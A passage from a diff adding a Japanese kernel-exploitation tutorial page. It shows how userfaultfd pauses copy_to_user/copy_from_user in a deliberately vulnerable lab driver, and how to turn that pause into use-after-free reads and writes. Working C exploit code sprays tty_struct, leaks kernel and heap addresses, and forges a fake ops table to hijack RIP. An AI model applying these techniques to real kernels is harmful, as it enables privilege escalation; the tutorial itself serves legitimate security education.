class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>このコードでは<code>register_uffd</code>にページのアドレスとuserfaultfdを設定するサイズを渡します。<code>register_uffd</code>はページフォルトを処理するスレッド<code>fault_handler_thread</code>を作成します。<br>
+ページフォルトが発生すると<code>fault_handler_thread</code>中の<code>read</code>でイベントを取得し、データを返します。上記のサンプルプログラムでは、何回目のページフォルトかによって返すデータを変更しています。</p>
+<p><code>main</code>関数では2ページ分の領域を確保<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>し、それに対してuserfaultfdを設定しています。最初の2つの<code>strcpy</code><sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>では初回アクセスによりページフォルトが発生するため、userfaultfdのハンドラが発火します。次のように、最初の2回でハンドラが呼ばれ、ハンドラで返したデータが反映されていれば成功です。</p>
+<center>
+  <img src="img/uffd_sample.png" alt="userfaultfdの使用例" style="width:480px;">
+</center>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_normal.png" alt="オオカミくん"></div>
+  <p class="says">
+    userfaultfdのハンドラは別スレッドで動くから、メインスレッドと違うCPUで動く可能性があるよ。
+    ハンドラ内でオブジェクトを確保するとき、CPUごとにキャッシュされたヒープ領域が使われるとUAFが失敗しちゃうから、sched_setaffinity関数でCPUを固定するように注意してね。
+  </p>
+</div>
+<h2><span id="raceの安定化">Raceの安定化</span></h2>
+<p>実際にuserfaultfdをexploitに利用してみましょう。<br>
+userfaultfdを使うことでページフォルトのタイミングでカーネル空間（ドライバ中の処理）からユーザー空間へコンテキストを切り替えられます。ページフォルトが起こるのは設定したユーザー空間のページを最初に読み書きしようとした時なので、今回のドライバでは<code>copy_from_user</code>や<code>copy_to_user</code>の箇所で処理を一時停止できます。列挙すると次の箇所で処理を止められることが分かります。</p>
+<ul>
+<li><code>blob_add</code>の<code>copy_from_user</code></li>
+<li><code>blob_get</code>の<code>copy_to_user</code></li>
+<li><code>blob_set</code>の<code>copy_from_user</code></li>
+</ul>
+<p>Use-after-Freeが目的なので、上記のような関数で処理を止めている間にデータを<code>blob_del</code>で削除できます。<code>blob_get</code>中に削除すればUAF Readが、<code>blob_set</code>中に削除すればUAF Writeが実現できます。<code>tty_struct</code>などをUse-after-Freeで読み書きしてみましょう。<br>
+図で流れを表すと次のようになります。</p>
+<center>
+  <img src="img/uffd_uafr.png" alt="userfaultfdによるUse-after-Free" style="width:720px;">
+</center>
+<p><code>tty_struct</code>と同じサイズ帯(kmalloc-1024)で確保したバッファ<code>victim</code>に対して<code>blob_get</code>を呼びます。この際userfaultfdを設定したアドレスを渡すと、<code>blob_get</code>中の<code>copy_to_user</code>でページフォルトが発生してハンドラが呼ばれます。排他制御をしていないためハンドラ中から<code>blob_del</code>が呼べて、その結果<code>victim</code>は解放されます。<br>
+さらに、<code>tty_struct</code>をsprayすると先ほど解放した<code>victim</code>の領域にttyオブジェクトが確保されます。あとはハンドラから適当なバッファを渡し、復帰すれば<code>copy_to_user</code>で<code>victim</code>のアドレスからデータがコピーされるため、ユーザー空間にttyオブジェクトがコピーされます。<br>
+同じ原理で<code>blob_set</code>を呼べばUAFによるオブジェクトの書き換えも可能です。コードを書いてUAFを確認してみましょう。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">copy</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">  <span class="keyword">long</span> uffd;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* メインスレッドと同じCPUで動かす */</span></span><br><span class="line">  <span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">cpu_set_t</span>), &amp;pwn_cpu))</span><br><span class="line">    fatal(<span class="string">&quot;sched_setaffinity&quot;</span>);</span><br><span class="line"></span><br><span class="line">  uffd = (<span class="keyword">long</span>)arg;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] fault_handler_thread: waiting for page fault...&quot;</span>);</span><br><span class="line">  pollfd.fd = uffd;</span><br><span class="line">  pollfd.events = POLLIN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pollfd.revents &amp; POLLERR || pollfd.revents &amp; POLLHUP)</span><br><span class="line">      fatal(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ページフォルト待機 */</span></span><br><span class="line">    <span class="keyword">if</span> (read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg)) &lt;= <span class="number">0</span>) fatal(<span class="string">&quot;read(uffd)&quot;</span>);</span><br><span class="line">    assert (msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 要求されたページとして返すデータを設定 */</span></span><br><span class="line">    <span class="keyword">switch</span> (fault_cnt++) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>: &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] UAF read&quot;</span>);</span><br><span class="line">        <span class="comment">/* [1-2] `blob_get`によるページフォルト */</span></span><br><span class="line">        <span class="comment">// victimを解放</span></span><br><span class="line">        del(victim);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// tty_structをスプレーし、victimの場所にかぶせる</span></span><br><span class="line">        <span class="keyword">int</span> fds[<span class="number">0x10</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">          fds[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);</span><br><span class="line">          <span class="keyword">if</span> (fds[i] == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/ptmx&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// このページのデータを持つバッファ（copy_to_userで上書きされるので適当）</span></span><br><span class="line">        copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)buf;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment">/* [2-2] `blob_set`によるページフォルト */</span></span><br><span class="line">        <span class="comment">// victimを解放</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address;</span><br><span class="line">    copy.len = <span class="number">0x1000</span>;</span><br><span class="line">    copy.mode = <span class="number">0</span>;</span><br><span class="line">    copy.copy = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;copy) == <span class="number">-1</span>) fatal(<span class="string">&quot;ioctl(UFFDIO_COPY)&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* メインスレッドとuffdハンドラが必ず同じCPUで動くよう設定する */</span></span><br><span class="line">  CPU_ZERO(&amp;pwn_cpu);</span><br><span class="line">  CPU_SET(<span class="number">0</span>, &amp;pwn_cpu);</span><br><span class="line">  <span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">cpu_set_t</span>), &amp;pwn_cpu))</span><br><span class="line">    fatal(<span class="string">&quot;sched_setaffinity&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd = open(<span class="string">&quot;/dev/fleckvieh&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/fleckvieh&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *page;</span><br><span class="line">  page = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">              MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (page == MAP_FAILED) fatal(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">  register_uffd(page, <span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">  buf = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  victim = add(buf, <span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">set</span>(victim, <span class="string">&quot;Hello&quot;</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* [1-1] UAF Read: tty_structのリーク */</span></span><br><span class="line">  get(victim, page, <span class="number">0x400</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80</span>; i += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02x: 0x%016lx\n&quot;</span>, i, *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(page + i));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>コードは長いですが、やっていることはさきほどの図に書いた通りです。100%の確率でUse-after-Freeが成功することが確認できます。</p>
+<center>
+  <img src="img/test_uaf.png" alt="Use-after-Freeの動作確認" style="width:480px;">
+</center>
+<p>上図のリークされたデータを見ると気づくかもしれませんが、<code>tty_struct</code>の先頭のデータがコピーできていません。（本来<code>tty_operation</code>などがありますが、最初の0x30バイトあたりはすべて0になっています。）<br>
+これは<code>copy_to_user</code>を大きいサイズで呼んだことが原因です。<code>copy_to_user</code>は<code>victim</code>の領域からデータをコピーしますが、先頭からコピーしようと試みます。<code>victim</code>の先頭の方を読み込むと、次にそのデータを宛先にコピーしようとします。ここで初めてページフォルトが発生するため、最初の方のバイト列はUAFが発生する前のものになります。<br>
+幸いにも<code>copy_to_user</code>はコピーサイズに応じて、コピーの各ループイテレーションでどれだけのサイズのデータをコピーするか（レジスタに貯め込むか）が変わります。したがって、例えば0x20のような小さいサイズで<code>copy_to_user</code>を呼べば、最初の0x10バイトのみがUAF前のデータとなり、<code>tty_operations</code>のポインタを含む残りの0x10バイトはUAF後のものがコピーされます。</p>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_thinking.png" alt="オオカミくん"></div>
+  <p class="says">
+  　アセンブリレベルでいつページフォルトが起きるかを把握できていないと、デバッグが大変そうだね。
+  </p>
+</div>
+<p>KASLRとヒープアドレスのリークができれば、同様にUAF Writeを作ります。<br>
+今回もいつもどおり偽の<code>tty_struct</code>の<code>ops</code>を偽の関数テーブルに向けるのですが、今回UAFが発生するアドレスは前回リークした場所と異なる可能性があることに注意してください。リークしたヒープのアドレスは<code>close</code>で解放した<code>tty_struct</code>の場所なので、まずは偽<code>tty_operation</code>をsprayするようにしましょう。（今回は<code>tty_operation</code>と<code>tty_struct</code>を兼用します。）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] UAF write&quot;</span>);</span><br><span class="line">        <span class="comment">/* [3-2] `blob_set`によるページフォルト */</span></span><br><span class="line">        <span class="comment">// 偽tty_operationをspray (リークしたkheapにかぶらせる)</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">          add(buf, <span class="number">0x400</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* [2-1] UAF Read: tty_structのリーク (ヒープ) */</span></span><br><span class="line">  victim = add(buf, <span class="number">0x400</span>);</span><br><span class="line">  get(victim, page+<span class="number">0x1000</span>, <span class="number">0x400</span>);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> kheap = *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(page + <span class="number">0x1038</span>) - <span class="number">0x38</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;kheap = 0x%016lx\n&quot;</span>, kheap);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) close(ptmx[i]);</span><br></pre></td></tr></table></figure>
+<p>リーク済みアドレスに偽関数テーブルを用意できたら、UAF Readと同様にUAFを引き起こします。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// victimを解放し、tty_structをspray</span></span><br><span class="line">del(victim);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">  ptmx[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);</span><br><span class="line">  <span class="keyword">if</span> (ptmx[i] == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/ptmx&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// このページのデータを持つバッファ（copy_from_userで書き込む内容）</span></span><br><span class="line">copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)buf;</span><br></pre></td></tr></table></figure>
+<p>今回はUAF Writeなので、書き込むデータを制御する必要があります。書き込むデータは<code>copy.src</code>に指定します。そのため、事前に偽<code>tty_struct</code>を用意しておきましょう。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* [3-1] UAF Write: tty_structの書き換え */</span></span><br><span class="line"><span class="built_in">memcpy</span>(buf, page+<span class="number">0x1000</span>, <span class="number">0x400</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *tty = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)buf;</span><br><span class="line">tty[<span class="number">0</span>] = <span class="number">0x0000000100005401</span>; <span class="comment">// magic</span></span><br><span class="line">tty[<span class="number">2</span>] = *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(page + <span class="number">0x10</span>); <span class="comment">// dev</span></span><br><span class="line">tty[<span class="number">3</span>] = kheap; <span class="comment">// ops</span></span><br><span class="line">tty[<span class="number">12</span>] = <span class="number">0xdeadbeef</span>; <span class="comment">// ops-&gt;ioctl</span></span><br><span class="line">victim = add(buf, <span class="number">0x400</span>);</span><br><span class="line"><span class="built_in">set</span>(victim, page+<span class="number">0x2000</span>, <span class="number">0x400</span>);</span><br></pre></td></tr></table></figure>
+<p>RIPが制御できていれば成功です。あとは各自で権限昇格までのexploitコードを完成させてください。</p>
+<center>
+  <img src="img/fleck_privesc.png" alt="Fleckviehでの権限昇格" style="width:480px;">
+</center>
+<p>サンプルのexploitコードは<a href="exploit/fleckvieh_uffd.c">ここ</a>からダウンロードできます。</p>
+<hr>
+<hr class="footnotes-sep">
+<section class="footnotes">
+<ol class="footnotes-list">
+<li id="fn1" class="footnote-item"><p>初回アクセス時にページフォルトを発生させたいので<code>MAP_POPULATE</code>を付けていません。 <a href="#fnref1" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn2" class="footnote-item"><p>直接<code>printf</code>すると、<code>printf</code>関数内でフォルトが発生してハンドラ中の<code>puts</code>や<code>printf</code>とバッファリングのデッドロックが発生してプログラムが停止するので注意しましょう。カーネルexploitの文脈では、カーネル空間からフォルトを発生されるので気にする必要はありません。 <a href="#fnref2" class="footnote-backref">↩︎</a></p>
+</li>
+</ol>
+</section>
+
+</div> 
+
+<div style="margin-top: 1em">
+    <div class="h-line-primary"></div>
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="../LK03/double_fetch.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"></div>
+        </div>
+    
+</div>
+
+<script>
+    window.onload = detectors();
+</script>
+
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+                © 2022 ptr-yudai 🐈
+                <br>
+            
+            
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+  </body>
+</html>
